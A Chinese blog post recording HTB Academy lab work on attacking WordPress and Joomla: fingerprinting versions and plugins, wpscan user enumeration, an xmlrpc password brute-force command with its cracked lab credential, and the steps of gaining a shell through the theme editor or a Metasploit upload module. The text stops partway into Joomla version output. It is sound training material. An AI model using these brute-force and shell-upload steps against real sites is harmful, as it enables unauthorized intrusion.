<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>hack_wordpress_and_Joomla | Ak4izZ&#39;s 滴博客儿</title>
  <meta name="author" content="Ak4izZ">
  
  <meta name="description" content="记录我在htb-academy上学习的学习过程，今天是WordPress和Joomla。"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="hack_wordpress_and_Joomla"/>
  <meta property="og:site_name" content="Ak4izZ&#39;s 滴博客儿"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="Ak4izZ&#39;s 滴博客儿" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 5.4.2"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">Ak4izZ&#39;s 滴博客儿</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> hack_wordpress_and_Joomla</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p>记录我在htb-academy上学习的学习过程，今天是WordPress和Joomla。</p>
<span id="more"></span>

<h1 id="WordPress"><a href="#WordPress" class="headerlink" title="WordPress"></a>WordPress</h1><h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><h2 id="关键文件-x2F-目录"><a href="#关键文件-x2F-目录" class="headerlink" title="关键文件&#x2F;目录"></a>关键文件&#x2F;目录</h2><p>先看一下整体结构</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ak4izZ@htb<span class="token punctuation">[</span>/htb<span class="token punctuation">]</span>$ tree <span class="token parameter variable">-L</span> <span class="token number">1</span> /var/www/html
<span class="token builtin class-name">.</span>
├── index.php
├── license.txt
├── readme.html
├── wp-activate.php
├── wp-admin
├── wp-blog-header.php
├── wp-comments-post.php
├── wp-config.php
├── wp-config-sample.php
├── wp-content
├── wp-cron.php
├── wp-includes
├── wp-links-opml.php
├── wp-load.php
├── wp-login.php
├── wp-mail.php
├── wp-settings.php
├── wp-signup.php
├── wp-trackback.php
└── xmlrpc.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>license.txt 包含版本<br>wp-activate.php 邮箱激活</p>
<p>wp-admin文件夹是后台目录</p>
<pre class="line-numbers language-none"><code class="language-none">    &#x2F;wp-admin&#x2F;login.php
​    &#x2F;wp-admin&#x2F;wp-login.php
​    &#x2F;login.php
​    &#x2F;wp-login.php

wp-content
	index.php
	plugins
	themes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>




<p>xmlrpc.php 是一个表示 WordPress 特性的文件，该特性允许使用 HTTP 作为传输机制，XML 作为编码机制来传输数据，已经被Wordperss REST API 取代。</p>
<p>wp-config.php 是配置文件，里面包含数据库连接配置，也可以用于开启debug模式。</p>
<p>wp-includes包含除了管理组件和属于网站的主题之外的所有内容。这是存储核心文件(如证书、字体、 JavaScript 文件和小部件)的目录。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ak4izZ@htb<span class="token punctuation">[</span>/htb<span class="token punctuation">]</span>$ tree <span class="token parameter variable">-L</span> <span class="token number">1</span> /var/www/html/wp-includes
<span class="token builtin class-name">.</span>
├── <span class="token operator">&lt;</span>SNIP<span class="token operator">></span>
├── theme.php
├── update.php
├── user.php
├── vars.php
├── version.php
├── widgets
├── widgets.php
├── wlwmanifest.xml
├── wp-db.php
└── wp-diff.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="WP用户角色"><a href="#WP用户角色" class="headerlink" title="WP用户角色"></a>WP用户角色</h2><table>
<thead>
<tr>
<th>Role</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>Administrator</td>
<td>This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.</td>
</tr>
<tr>
<td>Editor</td>
<td>An editor can publish and manage posts, including the posts of other users.</td>
</tr>
<tr>
<td>Author</td>
<td>Authors can publish and manage their own posts.</td>
</tr>
<tr>
<td>Contributor</td>
<td>These users can write and manage their own posts but cannot publish them.</td>
</tr>
<tr>
<td>Subscriber</td>
<td>These are normal users who can browse posts and edit their profiles.</td>
</tr>
</tbody></table>
<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>查看wp的版本，有下面几种方法</p>
<ul>
<li>view-source，然后搜索<code>&lt;meta name=&quot;generator&quot;</code></li>
<li>curl -s {url_to_target} | grep ‘&lt;meta name&#x3D;”generator”‘</li>
<li>wp-css</li>
<li>wp-js</li>
<li>readme.html in root directory</li>
</ul>
<h2 id="主题和插件"><a href="#主题和插件" class="headerlink" title="主题和插件"></a>主题和插件</h2><h2 id="手测"><a href="#手测" class="headerlink" title="手测"></a>手测</h2><p>以htb academy 的这一个靶机为例。</p>
<img src="/2023/04/19/hack-wordpress-and-Joomla/image-20230420224222955.png" class title="image-20230420224222955">


<p> <code>wp-content/plugins</code> </p>
<p><code>wp-content/themes</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop/htb<span class="token punctuation">]</span>
└─$ <span class="token function">curl</span> <span class="token parameter variable">-s</span> http://blog.inlanefreight.local/ <span class="token operator">|</span> <span class="token function">grep</span> themes 
<span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">'stylesheet'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'bootstrap-css'</span>  <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/css/bootstrap.min.css'</span> <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/css'</span> <span class="token assign-left variable">media</span><span class="token operator">=</span><span class="token string">'all'</span> /<span class="token operator">></span>
<span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">'stylesheet'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'kfi-icons-css'</span>  <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/kf-icons/css/style.css'</span> <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/css'</span> <span class="token assign-left variable">media</span><span class="token operator">=</span><span class="token string">'all'</span> /<span class="token operator">></span>
<span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">'stylesheet'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'owlcarousel-css'</span>  <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/OwlCarousel2-2.2.1/assets/owl.carousel.min.css'</span> <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/css'</span> <span class="token assign-left variable">media</span><span class="token operator">=</span><span class="token string">'all'</span> /<span class="token operator">></span>
<span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">'stylesheet'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'owlcarousel-theme-css'</span>  <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/OwlCarousel2-2.2.1/assets/owl.theme.default.min.css'</span> <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/css'</span> <span class="token assign-left variable">media</span><span class="token operator">=</span><span class="token string">'all'</span> /<span class="token operator">></span>
<span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">'stylesheet'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'business-gravity-blocks-css'</span>  <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/css/blocks.min.css'</span> <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/css'</span> <span class="token assign-left variable">media</span><span class="token operator">=</span><span class="token string">'all'</span> /<span class="token operator">></span>
<span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">'stylesheet'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'business-gravity-style-css'</span>  <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css'</span> <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/css'</span> <span class="token assign-left variable">media</span><span class="token operator">=</span><span class="token string">'all'</span> /<span class="token operator">></span>
<span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">'stylesheet'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'transport-gravity-style-parent-css'</span>  <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/themes/business-gravity/style.css?ver=5.8'</span> <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/css'</span> <span class="token assign-left variable">media</span><span class="token operator">=</span><span class="token string">'all'</span> /<span class="token operator">></span>
<span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">'stylesheet'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'transport-gravity-style-css'</span>  <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css?ver=1.0.0'</span> <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/css'</span> <span class="token assign-left variable">media</span><span class="token operator">=</span><span class="token string">'all'</span> /<span class="token operator">></span>
                   background-image: url<span class="token punctuation">(</span>http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/images/placeholder/business-gravity-banner-1920-850.jpg <span class="token punctuation">)</span><span class="token punctuation">;</span>
                   background-image: url<span class="token punctuation">(</span>http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/images/placeholder/business-gravity-banner-1920-850.jpg <span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token operator">&lt;</span>img <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">"http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/images/placeholder/loader.gif"</span> <span class="token assign-left variable">alt</span><span class="token operator">=</span><span class="token string">"Site Loader"</span><span class="token operator">></span>          <span class="token operator">&lt;</span>/div<span class="token operator">></span>
        <span class="token operator">&lt;</span>img <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">"http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/images/placeholder/business-gravity-1170-710.png"</span> <span class="token operator">></span>               <span class="token operator">&lt;</span>a <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"http://blog.inlanefreight.local/?p=1"</span><span class="token operator">></span><span class="token operator">&lt;</span>/a<span class="token operator">></span>
        Copyright © All Rights Reserved. Business Gravity Theme by <span class="token operator">&lt;</span>a <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"//keonthemes.com"</span> <span class="token assign-left variable">target</span><span class="token operator">=</span><span class="token string">"_blank"</span><span class="token operator">></span> Keon Themes <span class="token operator">&lt;</span>/a<span class="token operator">></span>
<span class="token operator">&lt;</span>script <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/javascript'</span> <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/js/bootstrap.min.js'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'bootstrap-js'</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span>
<span class="token operator">&lt;</span>script <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/javascript'</span> <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/js/skip-link-focus-fix.min.js'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'business-gravity-skip-link-focus-fix-js'</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span>
<span class="token operator">&lt;</span>script <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/javascript'</span> <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/js/navigation.js'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'business-gravity-navigation-js'</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span>
<span class="token operator">&lt;</span>script <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/javascript'</span> <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/OwlCarousel2-2.2.1/owl.carousel.min.js'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'owlcarousel-js'</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span>
<span class="token operator">&lt;</span>script <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/javascript'</span> <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/js/main.min.js'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'business-gravity-script-js'</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span>
<span class="token operator">&lt;</span>script <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/javascript'</span> <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/themes/transport-gravity/js/custom.js?ver=1.0.0'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'transport-gravity-script-js'</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span>


Ak4izZ@htb<span class="token punctuation">[</span>/htb<span class="token punctuation">]</span>$ <span class="token function">curl</span> <span class="token parameter variable">-s</span> http://blog.inlanefreight.local/?p<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">|</span> <span class="token function">grep</span> plugins

<span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">'stylesheet'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'contact-form-7-css'</span>  <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2'</span> <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/css'</span> <span class="token assign-left variable">media</span><span class="token operator">=</span><span class="token string">'all'</span> /<span class="token operator">></span>
<span class="token operator">&lt;</span>script <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/javascript'</span> <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.8'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'subscriber-js-js'</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span>
<span class="token operator">&lt;</span>script <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/javascript'</span> <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.8'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'validation-engine-en-js'</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span>
<span class="token operator">&lt;</span>script <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/javascript'</span> <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.8'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'validation-engine-js'</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span>
                <span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">'stylesheet'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'mm_frontend-css'</span>  <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.8'</span> <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/css'</span> <span class="token assign-left variable">media</span><span class="token operator">=</span><span class="token string">'all'</span> /<span class="token operator">></span>
<span class="token operator">&lt;</span>script <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/javascript'</span> <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.4.2'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'contact-form-7-js'</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span>
<span class="token operator">&lt;</span>script <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'text/javascript'</span> <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">'http://blog.inlanefreight.local/wp-content/plugins/wpdiscuz/assets/js/wpdiscuz-combo.min.js?ver=7.0.4'</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'wpdiscuz-combo-js-js'</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在多个页面内抓取，可以获得更多的信息。</p>
<p>存在插件：</p>
<p>wp-sitemap-page</p>
<p>mail-masta 5.8</p>
<p>contact-form-7 5.4.2</p>
<p>wpdiscuz 7.0.4 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/49967">存在未授权RCE漏洞</a></p>
<p>如果找不到版本的话可以去到<code>/wp-content/plgins/$&#123;plugin-name&#125;/readme.txt</code>查看，一般都会有。</p>
<img src="/2023/04/19/hack-wordpress-and-Joomla/image-20230420224157029.png" class title="image-20230420224157029">

<h2 id="工具：wpscan"><a href="#工具：wpscan" class="headerlink" title="工具：wpscan"></a>工具：wpscan</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> wpscan <span class="token parameter variable">--url</span> http://blog.inlanefreight.local <span class="token parameter variable">--enumerate</span> --api-token dEOFB<span class="token operator">&lt;</span>SNIP<span class="token operator">></span>

<span class="token operator">&lt;</span>SNIP<span class="token operator">></span>

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> User<span class="token punctuation">(</span>s<span class="token punctuation">)</span> Identified:

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> by:
									admin
 <span class="token operator">|</span> Found By: Author Posts - Display Name <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> admin
 <span class="token operator">|</span> Found By: Rss Generator <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span> Confirmed By:
 <span class="token operator">|</span>  Author Id Brute Forcing - Author Pattern <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span>  Login Error Messages <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> john
 <span class="token operator">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span> Confirmed By: Login Error Messages <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>从上面发现了一个rce的点，还有admin和doug两个用户，可以从这两个方面入手。</p>
<p>用户登录爆破可以从常规的登录页面wp-login，也可以从上面扫描到的<a target="_blank" rel="noopener" href="https://kinsta.com/blog/xmlrpc-php/">xmlrpc</a>，通过&#x2F;xmlrpc.php使用API登录。</p>
<blockquote>
<p>XML-RPC WordPress   是一种规定wordpress和其他进程通信的规范。然而，xmlrpc.php 也有它的缺点。它会给你的 WordPress 站点带来漏洞，现在已经被 WordPress REST API 所取代，后者在向其他应用程序开放 WordPress 方面做得更好。</p>
</blockquote>
<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><pre class="line-numbers language-shell-session" data-language="shell-session"><code class="language-shell-session"><span class="token output">sudo wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

&lt;SNIP>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后爆出来的凭证是：doug: jessica1</p>
<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>登进去之后，是管理员权限，我们可以通过修改PHP页面的源代码达成反弹shell。在Appearance的中，可以使用themem editor修改php文件。</p>
<img src="/2023/04/19/hack-wordpress-and-Joomla/image-20230421090248208.png" class title="image-20230421090248208">

<p>我们知道主题的文件都是放在themes&#x2F;{文件名}下的，因此可以直接对其发起请求。</p>
<img src="/2023/04/19/hack-wordpress-and-Joomla/image-20230421090422945.png" class title="image-20230421090422945">

<p>这样一来直接上传一个反弹shell就行了。</p>
<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>msf提供了wordpress自动化传马连接模块，可以使用<code>msf6 &gt; use exploit/unix/webapp/wp_admin_shell_upload </code> 调用。</p>
<h1 id="Joomla"><a href="#Joomla" class="headerlink" title="Joomla"></a>Joomla</h1><p>和WordPress一样，Joomla也是一个PHP编写的CMS</p>
<h2 id="指纹搜集"><a href="#指纹搜集" class="headerlink" title="指纹搜集"></a>指纹搜集</h2><h3 id="手测-1"><a href="#手测-1" class="headerlink" title="手测"></a>手测</h3><p>同样，在首页可以用&#x3D;&#x3D;grep&#x3D;&#x3D;抓一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ak4izZ@htb<span class="token punctuation">[</span>/htb<span class="token punctuation">]</span>$ <span class="token function">curl</span> <span class="token parameter variable">-s</span> http://dev.inlanefreight.local/ <span class="token operator">|</span> <span class="token function">grep</span> Joomla

	<span class="token operator">&lt;</span>meta <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"generator"</span> <span class="token assign-left variable">content</span><span class="token operator">=</span><span class="token string">"Joomla! - Open Source Content Management"</span> /<span class="token operator">></span>


<span class="token operator">&lt;</span>SNIP<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>&#x3D;&#x3D;robots.txt&#x3D;&#x3D;通常内容如下</p>
<pre class="line-numbers language-none"><code class="language-none"># If the Joomla site is installed within a folder
# eg www.example.com&#x2F;joomla&#x2F; then the robots.txt file
# MUST be moved to the site root
# eg www.example.com&#x2F;robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the &#x2F;administrator&#x2F; folder MUST
# be changed to read
# Disallow: &#x2F;joomla&#x2F;administrator&#x2F;
#
# For more information about the robots.txt standard, see:
# https:&#x2F;&#x2F;www.robotstxt.org&#x2F;orig.html

User-agent: *
Disallow: &#x2F;administrator&#x2F;
Disallow: &#x2F;bin&#x2F;
Disallow: &#x2F;cache&#x2F;
Disallow: &#x2F;cli&#x2F;
Disallow: &#x2F;components&#x2F;
Disallow: &#x2F;includes&#x2F;
Disallow: &#x2F;installation&#x2F;
Disallow: &#x2F;language&#x2F;
Disallow: &#x2F;layouts&#x2F;
Disallow: &#x2F;libraries&#x2F;
Disallow: &#x2F;logs&#x2F;
Disallow: &#x2F;modules&#x2F;
Disallow: &#x2F;plugins&#x2F;
Disallow: &#x2F;tmp&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在&#x3D;&#x3D;README.txt&#x3D;&#x3D;中也可以看到相关版本信息（根目录，注意大小写）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ak4izZ@htb<span class="token punctuation">[</span>/htb<span class="token punctuation">]</span>$ <span class="token function">curl</span> <span class="token parameter variable">-s</span> http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml <span class="token operator">|</span> xmllint <span class="token parameter variable">--format</span> -

<span class="token operator">&lt;</span>?xml <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">"1.0"</span> <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">"UTF-8"</span>?<span class="token operator">></span>
<span class="token operator">&lt;</span>extension <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">"3.6"</span> <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"file"</span> <span class="token assign-left variable">method</span><span class="token operator">=</span><span class="token string">"upgrade"</span><span class="token operator">></span>
  <span class="token operator">&lt;</span>name<span class="token operator">></span>files_joomla<span class="token operator">&lt;</span>/name<span class="token operator">></span>
  <span class="token operator">&lt;</span>author<span class="token operator">></span>Joomla<span class="token operator">!</span> Project<span class="token operator">&lt;</span>/author<span class="token operator">></span>
  <span class="token operator">&lt;</span>authorEmail<span class="token operator">></span>admin@joomla.org<span class="token operator">&lt;</span>/authorEmail<span class="token operator">></span>
  <span class="token operator">&lt;</span>authorUrl<span class="token operator">></span>www.joomla.org<span class="token operator">&lt;</span>/authorUrl<span class="token operator">></span>
  <span class="token operator">&lt;</span>copyright<span class="token operator">></span><span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2005</span> - <span class="token number">2019</span> Open Source Matters. All rights reserved<span class="token operator">&lt;</span>/copyright<span class="token operator">></span>
  <span class="token operator">&lt;</span>license<span class="token operator">></span>GNU General Public License version <span class="token number">2</span> or later<span class="token punctuation">;</span> see LICENSE.txt<span class="token operator">&lt;</span>/license<span class="token operator">></span>
